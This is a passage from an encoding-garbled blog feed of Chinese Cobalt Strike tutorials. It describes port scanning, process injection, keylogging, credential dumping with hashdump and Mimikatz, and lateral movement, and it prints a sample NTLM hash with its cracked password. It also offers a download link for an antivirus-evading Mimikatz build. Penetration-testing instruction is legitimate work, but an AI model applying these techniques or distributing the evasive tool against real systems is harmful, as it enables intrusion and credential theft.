        <content type="html"><![CDATA[<h2 id="0x01-ç«¯å£æ‰«æ"><a href="#0x01-ç«¯å£æ‰«æ" class="headerlink" title="0x01-ç«¯å£æ‰«æ"></a>0x01-ç«¯å£æ‰«æ</h2><p><a href="https://imgchr.com/i/elXh5R"><img src="https://s2.ax1x.com/2019/07/28/elXh5R.png" alt="elXh5R.png"></a></p><p>å³é”®ä¸€ä¸ªbeaconï¼Œé€‰æ‹©ç›®æ ‡â€“&gt;ç«¯å£æ‰«æ</p><p>æˆ–åœ¨beaconä¸­ä½¿ç”¨å‘½ä»¤portscan [ip] å‘½ä»¤</p><p>éšåCobaltstrikeä¼šè‡ªåŠ¨è¯†åˆ«ç›®æ ‡æœºæ‰€åœ¨çš„å†…ç½‘ipæ®µï¼Œå¯é€‰æ‹©ARPï¼ŒICMPï¼Œnoneä¸‰ç§æ–¹å¼è¿›è¡Œæ‰«æï¼Œportsä¸­å¡«å…¥ä½ è¦æ‰«æçš„ç«¯å£</p><p><a href="https://imgchr.com/i/elXWVJ"><img src="https://s2.ax1x.com/2019/07/28/elXWVJ.png" alt="elXWVJ.png"></a><br>æ‰«æåçš„ç»“æœï¼Œä¼šåœ¨beaconä¸­è¾“å‡ºï¼Œæˆ–å¯åœ¨ç›®æ ‡è§†å›¾ä¸­æŸ¥çœ‹åˆ°<br><a href="https://imgchr.com/i/elXo26"><img src="https://s2.ax1x.com/2019/07/28/elXo26.png" alt="elXo26.png"></a></p><h2 id="0x02-Net-view"><a href="#0x02-Net-view" class="headerlink" title="0x02-Net view"></a>0x02-Net view</h2><p>é€‰æ‹©ä¸€ä¸ªbeaconï¼Œå³é”®ï¼Œç›®æ ‡â€“&gt;Net View,æˆ–åœ¨beaconä¸­ä½¿ç”¨å‘½ä»¤net view</p><p><a href="https://imgchr.com/i/elXI8x"><img src="https://s2.ax1x.com/2019/07/28/elXI8x.png" alt="elXI8x.png"></a></p><p>å¦‚å›¾ï¼Œbeaconä¸­è¾“å‡ºäº†net viewçš„ä¿¡æ¯</p><p><a href="https://imgchr.com/i/elXfa9"><img src="https://s2.ax1x.com/2019/07/28/elXfa9.png" alt="elXfa9.png"></a></p>]]></content>
      
      
      <categories>
          
          <category> å®‰å…¨å·¥å…· </category>
          
      </categories>
      
      
        <tags>
            
            <tag> å®‰å…¨å·¥å…· </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Cobaltstrikeç³»åˆ—æ•™ç¨‹(å…­)æ–‡ä»¶/è¿›ç¨‹ç®¡ç†ä¸é”®ç›˜è®°å½•</title>
      <link href="/2019/06/12/Cobaltstrike%E7%B3%BB%E5%88%97%E6%95%99%E7%A8%8B-%E5%85%AD-%E6%96%87%E4%BB%B6-%E8%BF%9B%E7%A8%8B%E7%AE%A1%E7%90%86%E4%B8%8E%E9%94%AE%E7%9B%98%E8%AE%B0%E5%BD%95/"/>
      <url>/2019/06/12/Cobaltstrike%E7%B3%BB%E5%88%97%E6%95%99%E7%A8%8B-%E5%85%AD-%E6%96%87%E4%BB%B6-%E8%BF%9B%E7%A8%8B%E7%AE%A1%E7%90%86%E4%B8%8E%E9%94%AE%E7%9B%98%E8%AE%B0%E5%BD%95/</url>
      
        <content type="html"><![CDATA[<h2 id="0x01-æ–‡ä»¶ç®¡ç†"><a href="#0x01-æ–‡ä»¶ç®¡ç†" class="headerlink" title="0x01-æ–‡ä»¶ç®¡ç†"></a>0x01-æ–‡ä»¶ç®¡ç†</h2><h3 id="â‘ åŸºç¡€ç®¡ç†"><a href="#â‘ åŸºç¡€ç®¡ç†" class="headerlink" title="â‘ åŸºç¡€ç®¡ç†"></a>â‘ åŸºç¡€ç®¡ç†</h3><p>é€‰æ‹©ä¸€ä¸ªä¼šè¯ï¼Œå³é”®ï¼Œç›®æ ‡â€“&gt;æ–‡ä»¶ç®¡ç†<br><a href="https://imgchr.com/i/eM8fu8"><img src="https://s2.ax1x.com/2019/07/27/eM8fu8.png" alt="eM8fu8.png"></a><br>Uploadä¸ºä¸Šä¼ ä¸€ä¸ªæ–‡ä»¶ ï¼ŒMake Directoryä¸ºåˆ›å»ºæ–‡ä»¶å¤¹ï¼ŒList Drivesä¸ºåˆ—å‡ºç›˜ç¬¦ï¼Œrefreshä¸ºåˆ·æ–°ï¼Œè¿™å—å¾ˆç®€å•ï¼Œå°±ä¸ä¸€ä¸€è®²äº†ã€‚<br><a href="https://imgchr.com/i/eM8Rjf"><img src="https://s2.ax1x.com/2019/07/27/eM8Rjf.png" alt="eM8Rjf.png"></a></p><h3 id="â‘¡ä¸‹è½½æ–‡ä»¶"><a href="#â‘¡ä¸‹è½½æ–‡ä»¶" class="headerlink" title="â‘¡ä¸‹è½½æ–‡ä»¶"></a>â‘¡ä¸‹è½½æ–‡ä»¶</h3><p>éœ€è¦ä½¿ç”¨æ–‡ä»¶ç®¡ç†åŠŸèƒ½ï¼Œç„¶åå³é”®download<br><a href="https://imgchr.com/i/eM8c9I"><img src="https://s2.ax1x.com/2019/07/27/eM8c9I.png" alt="eM8c9I.png"></a><br>å†ç‚¹å‡»èœå•æ ä¸Šæ–¹çš„æ–‡ä»¶ä¸‹è½½æŒ‰é’®<br><a href="https://imgchr.com/i/eM8y4A"><img src="https://s2.ax1x.com/2019/07/27/eM8y4A.png" alt="eM8y4A.png"></a><br>ç‚¹å‡»sync filesï¼Œé…ç½®ä¿å­˜è·¯å¾„å³å¯ä¸‹è½½æ–‡ä»¶</p><h3 id="â‘¢æ‰§è¡Œæˆ–åˆ é™¤æ–‡ä»¶"><a href="#â‘¢æ‰§è¡Œæˆ–åˆ é™¤æ–‡ä»¶" class="headerlink" title="â‘¢æ‰§è¡Œæˆ–åˆ é™¤æ–‡ä»¶"></a>â‘¢æ‰§è¡Œæˆ–åˆ é™¤æ–‡ä»¶</h3><p><a href="https://imgchr.com/i/eM82gP"><img src="https://s2.ax1x.com/2019/07/27/eM82gP.png" alt="eM82gP.png"></a><br>æ‰§è¡Œæ–‡ä»¶ç‚¹å‡»executeåä¼šå¼¹å‡ºä¸€ä¸ªçª—å£ï¼Œè¦æ±‚ä½ è¾“å…¥è¦æ‰§è¡Œç¨‹åºçš„å‚æ•°ï¼Œè¿™è¾¹æŒ‰ä½ çš„è¦æ±‚å¡«å†™å°±è¡Œï¼Œä¸éœ€è¦å‚æ•°çš„è¯å°±ä¸å¡«ã€‚<br><a href="https://imgchr.com/i/eM8g3t"><img src="https://s2.ax1x.com/2019/07/27/eM8g3t.png" alt="eM8g3t.png"></a></p><h2 id="0x02-è¿›ç¨‹ç®¡ç†"><a href="#0x02-è¿›ç¨‹ç®¡ç†" class="headerlink" title="0x02-è¿›ç¨‹ç®¡ç†"></a>0x02-è¿›ç¨‹ç®¡ç†</h2><h3 id="â‘ è¿›å…¥è¿›ç¨‹ç®¡ç†"><a href="#â‘ è¿›å…¥è¿›ç¨‹ç®¡ç†" class="headerlink" title="â‘ è¿›å…¥è¿›ç¨‹ç®¡ç†"></a>â‘ è¿›å…¥è¿›ç¨‹ç®¡ç†</h3><p>é€‰æ‹©ä¸€ä¸ªbeaconï¼Œå³é”®ï¼Œç›®æ ‡â€“&gt;è¿›ç¨‹åˆ—è¡¨<br><a href="https://imgchr.com/i/eM8HCn"><img src="https://s2.ax1x.com/2019/07/27/eM8HCn.png" alt="eM8HCn.png"></a><br>è¿›ç¨‹åˆ—è¡¨ä¸­ ï¼Œkillä¸ºå…³é—­ç¨‹åºï¼Œrefreshä¸ºåˆ·æ–°è¿›ç¨‹åˆ—è¡¨ï¼Œinjectåˆ™æ˜¯æŠŠbeaconæ³¨å…¥è¿›ç¨‹ï¼ŒLog Keystrokesä¸ºé”®ç›˜è®°å½•ï¼ŒStea Tokenä¸ºçªƒå–è¿è¡ŒæŒ‡å®šç¨‹åºçš„ç”¨æˆ·ä»¤ç‰Œ<br><a href="https://imgchr.com/i/eM8hDS"><img src="https://s2.ax1x.com/2019/07/27/eM8hDS.png" alt="eM8hDS.png"></a><br>ç®€å•çš„åŠŸèƒ½å°±ä¸è®²äº†ï¼Œè¿™è¾¹è®²ä¸€ä¸‹è¿›ç¨‹æ³¨å…¥(inject)ï¼Œé”®ç›˜è®°å½•(Log Keystrokes)ã€‚</p><h3 id="â‘¡è¿›ç¨‹æ³¨å…¥"><a href="#â‘¡è¿›ç¨‹æ³¨å…¥" class="headerlink" title="â‘¡è¿›ç¨‹æ³¨å…¥"></a>â‘¡è¿›ç¨‹æ³¨å…¥</h3><p>è¯¥åŠŸèƒ½å¯ä»¥æŠŠä½ çš„beaconä¼šè¯æ³¨å…¥åˆ°å¦å¤–ä¸€ä¸ªç¨‹åºä¹‹ä¸­ï¼Œæ³¨å…¥åï¼ŒåŠæ—¶ä½ åŸæ¥çš„åé—¨è¿›ç¨‹è¢«å…³é—­ï¼Œä½ ä¾ç„¶å¯ä»¥æ‰‹æ¡ç›®æ ‡æœºçš„æƒé™<br><a href="https://imgchr.com/i/eM84Hg"><img src="https://s2.ax1x.com/2019/07/27/eM84Hg.png" alt="eM84Hg.png"></a><br>é€‰æ‹©è¿›ç¨‹ï¼Œç‚¹å‡»injectï¼Œéšåé€‰æ‹©ç›‘å¬å™¨ï¼Œç‚¹å‡»chooseï¼Œå³å¯å‘ç°Cobaltstrikeå¼¹å›äº†ç›®æ ‡æœºçš„ä¸€ä¸ªæ–°ä¼šè¯ï¼Œè¿™ä¸ªä¼šè¯å°±æ˜¯æˆåŠŸæ³¨å…¥åˆ°æŸè¿›ç¨‹çš„beacon</p><h3 id="â‘¢é”®ç›˜è®°å½•"><a href="#â‘¢é”®ç›˜è®°å½•" class="headerlink" title="â‘¢é”®ç›˜è®°å½•"></a>â‘¢é”®ç›˜è®°å½•</h3><p>é€‰æ‹©å¥½è¿›ç¨‹å(å¯ctrlå¤šé€‰)ï¼Œç‚¹å‡»Log Keystrokesï¼Œç„¶åå†ç‚¹å‡»èœå•æ ä¸Šçš„â€œé”®ç›˜è®°å½•â€æŒ‰é’®<br><a href="https://imgchr.com/i/eM8IEQ"><img src="https://s2.ax1x.com/2019/07/27/eM8IEQ.png" alt="eM8IEQ.png"></a></p><p>å¦‚å›¾ï¼ŒæˆåŠŸgetåˆ°ç›®æ ‡æœºçš„é”®ç›˜è®°å½•</p><p><a href="https://imgchr.com/i/eM8oNj"><img src="https://s2.ax1x.com/2019/07/27/eM8oNj.png" alt="eM8oNj.png"></a></p>]]></content>
      
      
      <categories>
          
          <category> å®‰å…¨å·¥å…· </category>
          
      </categories>
      
      
        <tags>
            
            <tag> å®‰å…¨å·¥å…· </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Cobaltstrikeç³»åˆ—æ•™ç¨‹(äº”)å‡­æ®å¯¼å‡º</title>
      <link href="/2019/06/11/Cobaltstrike%E7%B3%BB%E5%88%97%E6%95%99%E7%A8%8B-%E4%BA%94-%E5%87%AD%E6%8D%AE%E5%AF%BC%E5%87%BA/"/>
      <url>/2019/06/11/Cobaltstrike%E7%B3%BB%E5%88%97%E6%95%99%E7%A8%8B-%E4%BA%94-%E5%87%AD%E6%8D%AE%E5%AF%BC%E5%87%BA/</url>
      
        <content type="html"><![CDATA[<h2 id="0x01-å‡­æ®å¯¼å‡º"><a href="#0x01-å‡­æ®å¯¼å‡º" class="headerlink" title="0x01-å‡­æ®å¯¼å‡º"></a>0x01-å‡­æ®å¯¼å‡º</h2><p>å‡­æ®è¯´çš„é€šä¿—æ˜“æ‡‚ä¸€ç‚¹ï¼Œå¯ä»¥ç†è§£ä¸ºç›®æ ‡æœºçš„è´¦å·ï¼Œå¯†ç <br>å‡­æ®å¯¼å‡ºæ˜¯æ¸—é€æµ‹è¯•ä¸­å³ä¸ºé‡è¦çš„æ­¥éª¤ï¼Œå¯¼å‡ºç›®æ ‡æœºå‡­æ®åï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨å‡­æ®å®ç°æ¨ªå‘ç§»åŠ¨ï¼ˆåˆ©ç”¨hashä¼ é€’ï¼Œsmb&#x2F;rdpçˆ†ç ´ç­‰ç­‰æ‰‹æ³•ï¼‰æ¥æ‰©å¤§æˆ‘ä»¬çš„æˆ˜æœ</p><h2 id="0x02-Hashdumpå¯¼å‡ºhash"><a href="#0x02-Hashdumpå¯¼å‡ºhash" class="headerlink" title="0x02-Hashdumpå¯¼å‡ºhash"></a>0x02-Hashdumpå¯¼å‡ºhash</h2><p><a href="https://imgchr.com/i/eMeKdP"><img src="https://s2.ax1x.com/2019/07/27/eMeKdP.png" alt="eMeKdP.png"></a><br>é€‰æ‹©beaconä¼šè¯å³é”®,é€‰æ‹©æ‰§è¡Œâ€“&gt;è½¬å‚¨Hashï¼Œæˆ–åœ¨beaconä¸­è¾“å…¥hashdump<br>å¦‚å›¾beaconä¼šè¯æ¡†è¾“å‡ºäº†ç›®æ ‡æœºçš„ç”¨æˆ·åå’Œå¯†ç hashå€¼<br>ä»¥æœ¬æ¬¡å¯¼å‡ºçš„ä¸€ä¸ªå‡­æ®ä¸ºä¾‹</p><pre><code>admin:1022:aad3b435b51404eeaad3b435b51404ee:f4bb18c1165a89248f9e853b269a8995:::</code></pre><p>f4bb18c1165a89248f9e853b269a8995ä¸ºadminç”¨æˆ·çš„NTLM Hash<br>æˆ‘ä»¬å¯ä»¥å»cmd5ç­‰å¹³å°ç ´è§£è¯¥NTLMå¯†æ–‡ï¼Œå¦‚å›¾ï¼Œç ´è§£åæ˜æ–‡ä¸ºAbc123<br><a href="https://imgchr.com/i/eMe1JS"><img src="https://s2.ax1x.com/2019/07/27/eMe1JS.png" alt="eMe1JS.png"></a></p><h2 id="0x003-Mimikatzå¯¼å‡ºå‡­æ®"><a href="#0x003-Mimikatzå¯¼å‡ºå‡­æ®" class="headerlink" title="0x003-Mimikatzå¯¼å‡ºå‡­æ®"></a>0x003-Mimikatzå¯¼å‡ºå‡­æ®</h2><p><a href="https://imgchr.com/i/eMeuZt"><img src="https://s2.ax1x.com/2019/07/27/eMeuZt.png" alt="eMeuZt.png"></a></p><p>é€‰æ‹©æ‰§è¡Œâ€“&gt;Run Mimikatzï¼Œæˆ–åœ¨beaconä¸­æ‰§è¡Œlogonpasswordså‘½ä»¤å½“ä¼šè¯ä¸ºç®¡ç†å‘˜æƒé™æ—¶ï¼Œæ‰èƒ½dumpæˆåŠŸï¼Œå¦‚æœæƒé™å¾ˆä½ï¼Œè¯·å…ˆææƒ~æˆ‘æ—¥åä¹Ÿä¼šå†™</p><p>å¦‚å›¾ï¼ŒæˆåŠŸå¯¼å‡ºäº†ç™»é™†è¿‡3389çš„æŸç”¨æˆ·çš„æ˜æ–‡å¯†ç </p><p><a href="https://imgchr.com/i/eMedoV"><img src="https://s2.ax1x.com/2019/07/27/eMedoV.png" alt="eMedoV.png"></a></p><h2 id="0x04â€“å‡­æ®å­˜å‚¨"><a href="#0x04â€“å‡­æ®å­˜å‚¨" class="headerlink" title="0x04â€“å‡­æ®å­˜å‚¨"></a>0x04â€“å‡­æ®å­˜å‚¨</h2><p>å¦‚å›¾ï¼Œç‚¹å‡»æŒ‰é’®ï¼Œå³å¯æŸ¥çœ‹ä¹‹å‰dumpè¿‡çš„å‡­æ®ä¿¡æ¯<br><a href="https://imgchr.com/i/eMe8zQ"><img src="https://s2.ax1x.com/2019/07/27/eMe8zQ.png" alt="eMe8zQ.png"></a><br>åœ¨è¿›è¡Œæ¨ªå‘ç§»åŠ¨æ—¶ä¹Ÿå¯ä»¥ä½¿ç”¨ä¹‹å‰dumpè¿‡çš„å‡­æ®<br><a href="https://imgchr.com/i/eMe3Rg"><img src="https://s2.ax1x.com/2019/07/27/eMe3Rg.png" alt="eMe3Rg.png"></a></p><h2 id="0x05-å¤§ç¦åˆ©"><a href="#0x05-å¤§ç¦åˆ©" class="headerlink" title="0x05-å¤§ç¦åˆ©"></a>0x05-å¤§ç¦åˆ©</h2><p>ä»€ä¹ˆ?ä½ çš„mimikatzè¢«æ€äº†ï¼ŸåŠ è½½ä¸å‡ºæ¥ï¼Ÿï¼Ÿ<br><a href="https://imgchr.com/i/eMeMIf"><img src="https://s2.ax1x.com/2019/07/27/eMeMIf.png" alt="eMeMIf.png"></a><br>ä»Šå¤©ä¸ºåšå®¢æœ‹å‹ä»¬å…è´¹é€ä¸Šè‡ªæ”¹å…æ€ç‰ˆmimikatzï¼Œæ”¯æŒWindows10ï¼Œç¼–è¯‘æ—¶é»˜è®¤åŠŸèƒ½ä¸ºlogonpasswords</p><p><a href="https://imgchr.com/i/eMeJMj"><img src="https://s2.ax1x.com/2019/07/27/eMeJMj.png" alt="eMeJMj.png"></a><br>é“¾æ¥ï¼š<a href="https://pan.baidu.com/s/183BozwOrNNKurWOB-Gw74A">https://pan.baidu.com/s/183BozwOrNNKurWOB-Gw74A</a><br>æå–ç ï¼š3k84</p>]]></content>
      
      
      <categories>
          
          <category> å®‰å…¨å·¥å…· </category>
          
      </categories>
      
      
        <tags>
            
            <tag> å®‰å…¨å·¥å…· </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Cobaltstrikeç³»åˆ—æ•™ç¨‹(å››)èœå•æ ä¸è§†å›¾</title>
      <link href="/2019/06/10/Cobaltstrike%E7%B3%BB%E5%88%97%E6%95%99%E7%A8%8B-%E5%9B%9B-%E8%8F%9C%E5%8D%95%E6%A0%8F%E4%B8%8E%E8%A7%86%E5%9B%BE/"/>
      <url>/2019/06/10/Cobaltstrike%E7%B3%BB%E5%88%97%E6%95%99%E7%A8%8B-%E5%9B%9B-%E8%8F%9C%E5%8D%95%E6%A0%8F%E4%B8%8E%E8%A7%86%E5%9B%BE/</url>
      
        <content type="html"><![CDATA[<h2 id="0x01-Cobaltstrikeèœå•æ "><a href="#0x01-Cobaltstrikeèœå•æ " class="headerlink" title="0x01-Cobaltstrikeèœå•æ "></a>0x01-Cobaltstrikeèœå•æ </h2><p><a href="https://imgchr.com/i/eKTD29"><img src="https://s2.ax1x.com/2019/07/27/eKTD29.png" alt="eKTD29.png"></a></p><pre><code>1.æ–°å»ºè¿æ¥2.æ–­å¼€å½“å‰è¿æ¥3.ç›‘å¬å™¨4.æ”¹å˜è§†å›¾ä¸ºPivot Graph(å¯ä»¥æ˜¾ç¤ºå„ä¸ªç›®æ ‡çš„å…³ç³»)5.æ”¹å˜è§†å›¾ä¸ºSession Table(ä¼šè¯åˆ—è¡¨)6.æ”¹å˜è§†å›¾ä¸ºTarget Table(ç›®æ ‡åˆ—è¡¨)7.æŸ¥çœ‹å‡­æ®ä¿¡æ¯8.æŸ¥çœ‹æ–‡ä»¶ä¸‹è½½9.æŸ¥çœ‹é”®ç›˜è®°å½•10.æŸ¥çœ‹å±å¹•æˆªå›¾11.ç”Ÿæˆæ— çŠ¶æ€Beaconåé—¨12.javaè‡ªç­¾åç¨‹åºæ”»å‡»13.ç”Ÿæˆofficeå®åé—¨14.ç”Ÿæˆè„šæœ¬é€šè¿‡webä¼ é€’(åˆ©ç”¨powershellï¼Œbitsadminï¼Œregsvr32ç”Ÿæˆä¼šè¯)15.åœ¨Cobalt Strikeçš„webæœåŠ¡ä¸Šæ‰˜ç®¡ä¸€ä¸ªæ–‡ä»¶(æä¾›ä¸€ä¸ªæ–‡ä»¶ä¸‹è½½)16.ç®¡ç†Cobalt Strikeä¸Šè¿è¡Œçš„webæœåŠ¡17.å¸®åŠ©18.å…³äº</code></pre><h2 id="0x02-Cobaltstrikeè§†å›¾"><a href="#0x02-Cobaltstrikeè§†å›¾" class="headerlink" title="0x02-Cobaltstrikeè§†å›¾"></a>0x02-Cobaltstrikeè§†å›¾</h2><h3 id="â‘ èœå•4-Pivot-Graph-æ‹“æ‰‘å›¾"><a href="#â‘ èœå•4-Pivot-Graph-æ‹“æ‰‘å›¾" class="headerlink" title="â‘ èœå•4:Pivot Graph(æ‹“æ‰‘å›¾)"></a>â‘ èœå•4:Pivot Graph(æ‹“æ‰‘å›¾)</h3><p>å¦‚å›¾æ‰€ç¤ºï¼Œè¯¥è§†å›¾å¯ä»¥å¾ˆæ¸…æ¥šåœ°æŸ¥çœ‹å„ä¸»æœºä¹‹é—´çš„å…³ç³»ï¼Œè¯¥è§†å›¾åœ¨å¤§è§„æ¨¡å†…ç½‘æ¸—é€å’ŒAPTä¸­éå¸¸ç›´è§‚å’Œå®ç”¨ã€‚<br><a href="https://imgchr.com/i/eKTcb6"><img src="https://s2.ax1x.com/2019/07/27/eKTcb6.png" alt="eKTcb6.png"></a></p><h3 id="â‘¡èœå•5-Session-Table-ä¼šè¯åˆ—è¡¨"><a href="#â‘¡èœå•5-Session-Table-ä¼šè¯åˆ—è¡¨" class="headerlink" title="â‘¡èœå•5:Session Table(ä¼šè¯åˆ—è¡¨)"></a>â‘¡èœå•5:Session Table(ä¼šè¯åˆ—è¡¨)</h3><p>è¿™ä¸ªè§†å›¾æ˜¯æˆ‘ä»¬æ¸—é€æµ‹è¯•ä¸­æœ€ä¸ºå¸¸ç”¨çš„ï¼Œä»–ä¸»è¦æ˜¾ç¤ºçš„æ˜¯å½“å‰æ‰€æœ‰çš„ä¼šè¯ï¼Œä¼šè¯çš„æƒé™ï¼Œä¼šè¯è¿è¡Œåœ¨ç›®æ ‡æœºä¸Šçš„pidç­‰ç­‰<br>é€‰æ‹©ä¼šè¯å³é”®ï¼Œä¼šå‡ºç°å¾ˆå¤šåŠŸèƒ½</p><pre><code>è¿›å…¥beaconæ‰§è¡Œ        dump hashes è·å–hash        Elevate  ææƒ        Golden Ticket ç”Ÿæˆé»„é‡‘ç¥¨æ®æ³¨å…¥å½“å‰ä¼šè¯        MAke token  å‡­è¯è½¬æ¢        Run Mimikatz è¿è¡Œ Mimikatz         Spawn As ç”¨å…¶ä»–ç”¨æˆ·ç”ŸæˆCobalt Strikeä¾¦å¬å™¨ç›®æ ‡        Browser Pivot åŠ«æŒç›®æ ‡æµè§ˆå™¨è¿›ç¨‹        Desktop(VNC)  æ¡Œé¢äº¤äº’        File Browser  æ–‡ä»¶æµè§ˆå™¨        Net View å‘½ä»¤Net View        Port scan ç«¯å£æ‰«æ        Process list è¿›ç¨‹åˆ—è¡¨        Screenshot æˆªå›¾ä¸­è½¬        SOCKS Server ä»£ç†æœåŠ¡        Listener  åå‘ç«¯å£è½¬å‘        Deploy VPN éƒ¨ç½²VPNSpawn  æ–°çš„é€šè®¯æ¨¡å¼å¹¶ç”Ÿæˆä¼šè¯Session ä¼šè¯ç®¡ç†ï¼Œåˆ é™¤ï¼Œå¿ƒè·³æ—¶é—´ï¼Œé€€å‡ºï¼Œå¤‡æ³¨</code></pre><p><a href="https://imgchr.com/i/eKTyK1"><img src="https://s2.ax1x.com/2019/07/27/eKTyK1.png" alt="eKTyK1.png"></a></p><h3 id="â‘¢èœå•6-Target-Table-ç›®æ ‡åˆ—è¡¨"><a href="#â‘¢èœå•6-Target-Table-ç›®æ ‡åˆ—è¡¨" class="headerlink" title="â‘¢èœå•6:Target Table(ç›®æ ‡åˆ—è¡¨)"></a>â‘¢èœå•6:Target Table(ç›®æ ‡åˆ—è¡¨)</h3><p>  æœ¬å¤„æ˜¾ç¤ºçš„æ˜¯åœ¨beaconä¸­æ‰§è¡Œä¸»æœºå­˜æ´»æ‰«æ&#x2F;ç«¯å£æ‰«æåï¼Œæ¢æµ‹å‡ºçš„å­˜æ´»çš„ä¸»æœºã€‚<br><a href="https://imgchr.com/i/eKT6Dx"><img src="https://s2.ax1x.com/2019/07/27/eKT6Dx.png" alt="eKT6Dx.png"></a></p><p>  åœ¨æœ¬è§†å›¾ä¸­ï¼Œé€‰æ‹©ç›®æ ‡å³é”®<br><a href="https://imgchr.com/i/eKTrvR"><img src="https://s2.ax1x.com/2019/07/27/eKTrvR.png" alt="eKTrvR.png"></a></p><p>   å¦‚å›¾ï¼Œcså¯ä»¥ä½¿ç”¨å¤šç§æ–¹å¼ç™»å½•åˆ°ç›®æ ‡ä¸»æœºï¼ˆè¿›è¡Œå†…ç½‘æ¨ªå‘ç§»åŠ¨ï¼‰ï¼Œå¦‚æœå¤šå°æœåŠ¡å™¨ä½¿ç”¨äº†åŒæ ·çš„å‡­æ®ï¼Œæˆ‘ä»¬å°±å¯ä»¥ä½¿ç”¨æ­¤åŠŸèƒ½è¿›è¡Œhashä¼ é€’ï¼Œæ‹¿ä¸‹å¤šå°æœåŠ¡å™¨æƒé™<br>å½“ç„¶ï¼Œå…¶ä¹Ÿå¸¦æœ‰ç«¯å£æ‰«æåŠŸèƒ½ï¼Œå¯ä»¥æ‰«ææŒ‡å®šä¸»æœºçš„ç«¯å£ã€‚</p><p><a href="https://imgchr.com/i/eKT2VK"><img src="https://s2.ax1x.com/2019/07/27/eKT2VK.png" alt="eKT2VK.png"></a></p>]]></content>
      
      
      <categories>
          
          <category> å®‰å…¨å·¥å…· </category>
          
      </categories>
      
      
        <tags>
            
            <tag> å®‰å…¨å·¥å…· </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Cobaltstrikeç³»åˆ—æ•™ç¨‹(ä¸‰)beaconè¯¦è§£</title>
      <link href="/2019/06/09/Cobaltstrike%E7%B3%BB%E5%88%97%E6%95%99%E7%A8%8B-%E4%B8%89-beacon%E8%AF%A6%E8%A7%A3/"/>
      <url>/2019/06/09/Cobaltstrike%E7%B3%BB%E5%88%97%E6%95%99%E7%A8%8B-%E4%B8%89-beacon%E8%AF%A6%E8%A7%A3/</url>
      
        <content type="html"><![CDATA[<h2 id="0x01-Beaconè¯¦è§£"><a href="#0x01-Beaconè¯¦è§£" class="headerlink" title="0x01-Beaconè¯¦è§£"></a>0x01-Beaconè¯¦è§£</h2><h3 id="1-Beaconå‘½ä»¤"><a href="#1-Beaconå‘½ä»¤" class="headerlink" title="1.Beaconå‘½ä»¤"></a>1.Beaconå‘½ä»¤</h3><p>å¤§å®¶é€šè¿‡ç³»åˆ—æ•™ç¨‹(äºŒ)çš„å­¦ä¹ ï¼Œé…ç½®å¥½Listnerï¼Œè®©ç›®æ ‡æœºæ‰§è¡Œæˆ‘ä»¬çš„Payload&#x2F;åé—¨ç¨‹åºåï¼Œå³å¯å‘ç°ç›®æ ‡æœºå·²ç»ä¸Šçº¿<br><a href="%5Burl%5Dhttps://imgchr.com/i/eKZqk8%5B/url%5D"><img src="https://s2.ax1x.com/2019/07/27/eKZqk8.png" alt="eKZqk8.png"></a><br>å³é”®ç›®æ ‡interactæ¥ä½¿ç”¨Beaconï¼Œæˆ‘ä»¬ç”¨å®ƒæ¥æ‰§è¡Œå„ç§å‘½ä»¤<br><a href="%5Burl%5Dhttps://imgchr.com/i/eKZOfg%5B/url%5D"><img src="https://s2.ax1x.com/2019/07/27/eKZOfg.png" alt="eKZOfg.png"></a></p><p>â€»åœ¨Cobalt Strikeä¸­å®ƒçš„å¿ƒè·³é»˜è®¤æ˜¯60s(å³sleepæ—¶é—´ä¸º60sï¼Œæ¯ä¸€åˆ†é’Ÿç›®æ ‡ä¸»æœºä¸teamserveré€šä¿¡ä¸€æ¬¡)ï¼Œ è¿™ä¼šè®©æˆ‘ä»¬æ‰§è¡Œå‘½ä»¤æˆ–è¿›è¡Œå…¶ä»–æ“ä½œå“åº”å¾ˆæ…¢ã€‚ã€‚ã€‚<br>æˆ‘åˆšå¼€å§‹æ²¡è®¾ç½®sleepæ—¶é—´ç”šè‡³ä»¥ä¸ºæ˜¯cobaltstrikeåäº†â€“||ã€‚å¦‚æœsleepæ—¶é—´è¿‡é•¿ï¼Œåœ¨ä¸‹è½½æ–‡ä»¶é¢å‰æ›´ä¸ºæ˜æ˜¾ï¼Œæ‰€ä»¥åœ¨æµ‹è¯•æ—¶ä¼šæŠŠæ—¶é—´é™ä½ä¸€ç‚¹ ã€‚æ‰€ä»¥æ‹¿åˆ°beaconæˆ‘ä¸€èˆ¬å…ˆæ‰§è¡Œsleep 5ï¼Œå¤§å®¶å¯ä»¥æ ¹æ®å®æˆ˜ç¯å¢ƒæ¥è°ƒèŠ‚ï¼Œå»ºè®®ä¸è¦å¤ªå¿«ï¼Œä¸ç„¶æµé‡ä¼šå¾ˆæ˜æ˜¾ã€‚<br><img src="https://s2.ax1x.com/2019/07/27/eKmbRg.png" alt="eKmbRg.png"><br>â€»æ³¨æ„ï¼šbeaconä¸­ä¸èƒ½ç›´æ¥è¾“å…¥cmdå‘½ä»¤ï¼Œæ¯”å¦‚è¦è®©ç›®æ ‡æœºæ‰§è¡Œipconfigè¿™æ¡cmdå‘½ä»¤ï¼Œå¯¹åº”çš„beaconå‘½ä»¤æ˜¯shell ipconfig,æ–°äººä¸è¦åœ¨è¿™é‡Œè¸©å‘å“ˆ<br>å…¶ä»–çš„beaconå‘½ä»¤ï¼Œå¤§å®¶å¯ä»¥åœ¨beaconä¸­è¾“å…¥helpæ¥è·å–~<br>æˆ‘åœ¨è¿™è´´å‡ºä¸€éƒ¨åˆ†æ±‰åŒ–çš„å‘½ä»¤</p><pre><code>Beacon Commands    Command                   Description    -------                   -----------    browserpivot              æ³¨å…¥å—å®³è€…æµè§ˆå™¨è¿›ç¨‹    bypassuac                 ç»•è¿‡UAC    cancel                    å–æ¶ˆæ­£åœ¨è¿›è¡Œçš„ä¸‹è½½    cd                        åˆ‡æ¢ç›®å½•    checkin                   å¼ºåˆ¶è®©è¢«æ§ç«¯å›è¿ä¸€æ¬¡    clear                     æ¸…é™¤beaconå†…éƒ¨çš„ä»»åŠ¡é˜Ÿåˆ—    connect                   Connect to a Beacon peer over TCP    covertvpn                 éƒ¨ç½²Covert VPNå®¢æˆ·ç«¯    cp                        å¤åˆ¶æ–‡ä»¶    dcsync                    ä»DCä¸­æå–å¯†ç å“ˆå¸Œ    desktop                   è¿œç¨‹VNC    dllinject                 